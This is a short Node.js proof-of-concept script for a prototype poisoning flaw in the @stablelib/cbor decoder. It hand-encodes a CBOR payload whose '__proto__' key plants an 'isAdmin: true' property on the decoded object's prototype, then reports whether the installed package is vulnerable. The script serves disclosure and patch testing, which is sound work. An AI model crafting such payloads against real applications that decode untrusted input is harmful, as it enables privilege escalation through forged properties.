#!/usr/bin/env node
// @stablelib/cbor Prototype Poisoning PoC (GHSA-w48f-fwg7-ww6p)
// Usage: node poc.js

let decode;
try {
  const stablelibCbor = require(require.resolve('@stablelib/cbor', { paths: [process.cwd()] }));
  decode = stablelibCbor.decode;
} catch (e) {
  console.log("Please install @stablelib/cbor locally first to run the PoC.");
  console.log("Example: npm i @stablelib/cbor@2.0.1");
  process.exit(1);
}

// CBOR:
// {
//   "__proto__": { "isAdmin": true }
// }
//
// a1                    map(1)
//   69                  text(9)
//     "__proto__"
//   a1                  map(1)
//     67                text(7)
//       "isAdmin"
//     f5                true

const payload = new Uint8Array([
  0xa1,
  0x69, 0x5f, 0x5f, 0x70, 0x72, 0x6f, 0x74, 0x6f, 0x5f, 0x5f,
  0xa1,
  0x67, 0x69, 0x73, 0x41, 0x64, 0x6d, 0x69, 0x6e,
  0xf5
]);

console.log("[*] Decoding payload with '__proto__' key...");
const obj = decode(payload);

console.log("[*] Checking properties...");
const hasOwnIsAdmin = Object.hasOwn(obj, "isAdmin");
const inheritedIsAdmin = obj.isAdmin === true;
const prototypeHasIsAdmin = Object.getPrototypeOf(obj) && Object.getPrototypeOf(obj).isAdmin === true;

console.log(`Object.hasOwn(obj, "isAdmin"): ${hasOwnIsAdmin}`);
console.log(`obj.isAdmin: ${inheritedIsAdmin}`);
console.log(`Object.getPrototypeOf(obj).isAdmin: ${prototypeHasIsAdmin}`);

if (!hasOwnIsAdmin && inheritedIsAdmin && prototypeHasIsAdmin) {
  console.log("[VULNERABLE] Successfully poisoned the prototype of the decoded object!");
  process.exit(1);
} else {
  console.log("[SAFE] The decoder did not poison the prototype. The package is patched!");
  process.exit(0);
}
